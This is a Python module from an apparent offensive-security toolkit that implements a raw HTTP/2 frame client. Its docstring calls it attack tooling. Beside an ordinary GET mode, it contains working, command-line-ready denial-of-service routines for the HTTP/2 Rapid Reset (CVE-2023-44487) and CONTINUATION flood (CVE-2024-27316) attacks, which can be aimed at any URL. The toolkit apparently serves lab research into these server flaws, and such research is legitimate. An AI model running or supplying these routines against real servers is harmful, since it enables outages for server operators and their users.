#!/usr/bin/env python3
"""
redshift_toolkit.web.http2_client — HTTP/2 frame-level client.

Why
---
Researching HTTP/2 attacks (CONTINUATION flood CVE-2024-27316, Rapid Reset
CVE-2023-44487, H2.* smuggling) requires sending H2 frames the way the
spec doesn't expect. Standard libraries (`hyper`, `httpx`, `nghttp2`) hide
frame sequencing behind a clean API, which is exactly what we don't want.

This client is intentionally low-level:
  - sends raw frames you specify
  - exposes HPACK encode/decode for header blocks
  - lets you split a HEADERS block into HEADERS + N CONTINUATION frames
  - lets you open and reset streams in arbitrary order
  - speaks the prior-knowledge upgrade ("h2c") for plaintext, or ALPN for TLS

Usage
-----
  python3 -m redshift_toolkit.web.http2_client --url https://example.com --get /
  python3 -m redshift_toolkit.web.http2_client --url https://example.com \\
      --rapid-reset 100        # send 100 streams and immediately RST each
  python3 -m redshift_toolkit.web.http2_client --url https://example.com \\
      --continuation-flood 50  # CVE-2024-27316 style

API
---
  client = Http2Client("example.com", 443, tls=True)
  client.connect()
  sid = client.next_stream_id()
  client.send_headers(sid, [(":method","GET"), (":path","/"), ...], end_stream=True)
  for frame in client.recv_frames(timeout=5):
      print(frame)

Notes
-----
This module implements the bare minimum of HPACK (literal w/o indexing) for
sending; on RX we only inspect frame types and stream IDs, not full HPACK
decompression. That's enough for attack tooling.

Author: Redshift Project — Module 13
License: MIT — Lab use only.
"""

from __future__ import annotations

import argparse
import socket
import ssl
import struct
import sys
import time
from dataclasses import dataclass
from urllib.parse import urlsplit

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"


def paint(s: str, c: str, on: bool) -> str:
    return f"{c}{s}{RESET}" if on else s


# Frame types
FRAME_DATA = 0x00
FRAME_HEADERS = 0x01
FRAME_PRIORITY = 0x02
FRAME_RST_STREAM = 0x03
FRAME_SETTINGS = 0x04
FRAME_PUSH_PROMISE = 0x05
FRAME_PING = 0x06
FRAME_GOAWAY = 0x07
FRAME_WINDOW_UPDATE = 0x08
FRAME_CONTINUATION = 0x09

FRAME_NAMES = {
    0x00: "DATA", 0x01: "HEADERS", 0x02: "PRIORITY", 0x03: "RST_STREAM",
    0x04: "SETTINGS", 0x05: "PUSH_PROMISE", 0x06: "PING", 0x07: "GOAWAY",
    0x08: "WINDOW_UPDATE", 0x09: "CONTINUATION",
}

# Flags
FLAG_END_STREAM = 0x01
FLAG_END_HEADERS = 0x04
FLAG_PADDED = 0x08
FLAG_PRIORITY = 0x20
FLAG_ACK = 0x01

CONNECTION_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"


@dataclass
class Frame:
    length: int
    type: int
    flags: int
    stream_id: int
    payload: bytes

    @property
    def name(self) -> str:
        return FRAME_NAMES.get(self.type, f"UNKNOWN(0x{self.type:02x})")


def _hpack_encode_literal(name: str, value: str) -> bytes:
    """HPACK literal-without-indexing encoding. Good enough for our purposes.

    Lower-cases names (HTTP/2 requirement). Uses 7-bit prefix lengths.
    """
    name_b = name.lower().encode()
    val_b = value.encode()
    out = bytearray([0x00])  # literal w/o indexing, new name
    out.append(len(name_b))
    out += name_b
    out.append(len(val_b))
    out += val_b
    return bytes(out)


def hpack_encode_block(headers: list[tuple[str, str]]) -> bytes:
    return b"".join(_hpack_encode_literal(k, v) for k, v in headers)


def _frame_header(length: int, type_: int, flags: int, stream_id: int) -> bytes:
    """24-bit length, 8-bit type, 8-bit flags, 1-bit reserved + 31-bit stream id."""
    return (length.to_bytes(3, "big") + bytes([type_, flags])
            + (stream_id & 0x7FFFFFFF).to_bytes(4, "big"))


def make_frame(type_: int, flags: int, stream_id: int, payload: bytes) -> bytes:
    return _frame_header(len(payload), type_, flags, stream_id) + payload


def make_settings_ack() -> bytes:
    return make_frame(FRAME_SETTINGS, FLAG_ACK, 0, b"")


def make_settings(settings: list[tuple[int, int]]) -> bytes:
    payload = b"".join(struct.pack("!HI", k, v) for k, v in settings)
    return make_frame(FRAME_SETTINGS, 0, 0, payload)


def make_rst_stream(stream_id: int, error_code: int = 8) -> bytes:
    return make_frame(FRAME_RST_STREAM, 0, stream_id,
                      error_code.to_bytes(4, "big"))


class Http2Client:
    def __init__(self, host: str, port: int = 443, *, tls: bool = True,
                 timeout: float = 10.0, tls_verify: bool = True):
        self.host = host
        self.port = port
        self.tls = tls
        self.timeout = timeout
        self.tls_verify = tls_verify
        self.sock: socket.socket | None = None
        self._stream = 1  # client streams must be odd, increasing

    def next_stream_id(self) -> int:
        sid = self._stream
        self._stream += 2
        return sid

    def connect(self) -> None:
        s = socket.create_connection((self.host, self.port), timeout=self.timeout)
        if self.tls:
            ctx = ssl.create_default_context()
            ctx.set_alpn_protocols(["h2"])
            if not self.tls_verify:
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=self.host)
            negotiated = s.selected_alpn_protocol()
            if negotiated != "h2":
                raise RuntimeError(f"server did not negotiate h2 (got {negotiated!r})")
        self.sock = s
        # Send connection preface
        s.sendall(CONNECTION_PREFACE)
        # Send empty SETTINGS
        s.sendall(make_settings([]))

    def close(self) -> None:
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None

    def send_raw(self, data: bytes) -> None:
        assert self.sock is not None
        self.sock.sendall(data)

    def send_frame(self, type_: int, flags: int, stream_id: int,
                   payload: bytes) -> None:
        self.send_raw(make_frame(type_, flags, stream_id, payload))

    def send_headers(self, stream_id: int, headers: list[tuple[str, str]],
                     end_stream: bool = True, end_headers: bool = True) -> None:
        block = hpack_encode_block(headers)
        flags = (FLAG_END_STREAM if end_stream else 0) | \
                (FLAG_END_HEADERS if end_headers else 0)
        self.send_frame(FRAME_HEADERS, flags, stream_id, block)

    def send_continuation_flood(self, stream_id: int, count: int,
                                fragment_size: int = 16) -> None:
        """Send HEADERS without END_HEADERS, then `count` CONTINUATION frames
        without END_HEADERS. Demonstrates CVE-2024-27316 class behavior.
        """
        # Initial HEADERS frame, no END_HEADERS
        self.send_frame(FRAME_HEADERS, 0, stream_id, b"\x00" * fragment_size)
        for _ in range(count):
            self.send_frame(FRAME_CONTINUATION, 0, stream_id,
                            b"\x00" * fragment_size)
        # We never send END_HEADERS — server should kill the stream
        # quickly if patched.

    def rapid_reset(self, n: int, headers: list[tuple[str, str]]) -> None:
        """Open n streams, immediately RST each. CVE-2023-44487 class."""
        for _ in range(n):
            sid = self.next_stream_id()
            self.send_headers(sid, headers, end_stream=True)
            self.send_raw(make_rst_stream(sid, 8))

    def recv_frame(self, timeout: float | None = None) -> Frame | None:
        assert self.sock is not None
        if timeout is not None:
            self.sock.settimeout(timeout)
        try:
            head = b""
            while len(head) < 9:
                chunk = self.sock.recv(9 - len(head))
                if not chunk:
                    return None
                head += chunk
            length = int.from_bytes(head[0:3], "big")
            type_ = head[3]
            flags = head[4]
            stream_id = int.from_bytes(head[5:9], "big") & 0x7FFFFFFF
            payload = b""
            while len(payload) < length:
                chunk = self.sock.recv(length - len(payload))
                if not chunk:
                    break
                payload += chunk
            f = Frame(length=length, type=type_, flags=flags,
                      stream_id=stream_id, payload=payload)
            # Auto-ack peer SETTINGS to keep the connection alive
            if f.type == FRAME_SETTINGS and not (f.flags & FLAG_ACK):
                self.send_raw(make_settings_ack())
            return f
        except (socket.timeout, OSError):
            return None

    def recv_until(self, deadline_s: float = 5.0,
                   stop_on_goaway: bool = True) -> list[Frame]:
        out: list[Frame] = []
        end = time.time() + deadline_s
        while time.time() < end:
            f = self.recv_frame(timeout=max(0.1, end - time.time()))
            if not f:
                continue
            out.append(f)
            if stop_on_goaway and f.type == FRAME_GOAWAY:
                break
        return out


# ─── CLI ────────────────────────────────────────────────────────────────────
def _build_pseudo_headers(method: str, path: str, authority: str,
                          scheme: str) -> list[tuple[str, str]]:
    return [
        (":method", method),
        (":path", path),
        (":authority", authority),
        (":scheme", scheme),
        ("user-agent", "redshift-toolkit-h2/0.4"),
        ("accept", "*/*"),
    ]


def main() -> int:
    ap = argparse.ArgumentParser(description="HTTP/2 frame-level client.")
    ap.add_argument("--url", required=True, help="https://host[:port]/path")
    ap.add_argument("--get", default=None, help="path to GET (default: from --url)")
    ap.add_argument("--insecure", action="store_true")
    ap.add_argument("--rapid-reset", type=int, default=0,
                    help="open N streams then RST each (CVE-2023-44487)")
    ap.add_argument("--continuation-flood", type=int, default=0,
                    help="send N CONTINUATION frames without END_HEADERS (CVE-2024-27316)")
    ap.add_argument("--timeout", type=float, default=5.0)
    ap.add_argument("--no-color", action="store_true")
    args = ap.parse_args()
    color = sys.stdout.isatty() and not args.no_color

    sp = urlsplit(args.url)
    if sp.scheme not in ("http", "https"):
        print("only http/https URLs are supported", file=sys.stderr)
        return 2
    host = sp.hostname or ""
    port = sp.port or (443 if sp.scheme == "https" else 80)
    path = args.get or (sp.path or "/")
    if sp.query and not args.get:
        path += "?" + sp.query
    tls = sp.scheme == "https"

    c = Http2Client(host, port, tls=tls, timeout=args.timeout,
                    tls_verify=not args.insecure)
    try:
        c.connect()
    except Exception as e:
        print(paint(f"[!] connect failed: {e}", RED, color), file=sys.stderr)
        return 1

    print(paint(f"[*] connected, h2 ALPN ok: {host}:{port}", GREEN, color))

    headers = _build_pseudo_headers("GET", path, host, sp.scheme)

    if args.rapid_reset > 0:
        print(paint(f"[*] rapid-reset: opening {args.rapid_reset} streams",
                    YELLOW, color))
        t0 = time.time()
        c.rapid_reset(args.rapid_reset, headers)
        print(f"    sent in {(time.time() - t0)*1000:.0f} ms")
        frames = c.recv_until(deadline_s=args.timeout)
        print(f"    received {len(frames)} frame(s)")
        types = {}
        for f in frames:
            types[f.name] = types.get(f.name, 0) + 1
        for k, v in sorted(types.items()):
            print(f"      {k}: {v}")
        c.close()
        return 0

    if args.continuation_flood > 0:
        print(paint(f"[*] CONTINUATION-flood: {args.continuation_flood} frames "
                    f"with no END_HEADERS", YELLOW, color))
        sid = c.next_stream_id()
        t0 = time.time()
        c.send_continuation_flood(sid, args.continuation_flood)
        sent_ms = (time.time() - t0) * 1000
        frames = c.recv_until(deadline_s=args.timeout)
        print(f"    sent in {sent_ms:.0f} ms; received {len(frames)} frame(s)")
        for f in frames[:10]:
            print(f"      ← {f.name} stream={f.stream_id} flags=0x{f.flags:02x} "
                  f"len={f.length}")
        c.close()
        return 0

    # Default: simple GET
    sid = c.next_stream_id()
    c.send_headers(sid, headers, end_stream=True)
    frames = c.recv_until(deadline_s=args.timeout)
    print(f"[*] received {len(frames)} frame(s):")
    for f in frames:
        marker = "→" if f.stream_id == sid else " "
        print(f"   {marker} {f.name:<14} stream={f.stream_id} "
              f"flags=0x{f.flags:02x} len={f.length}")
    c.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
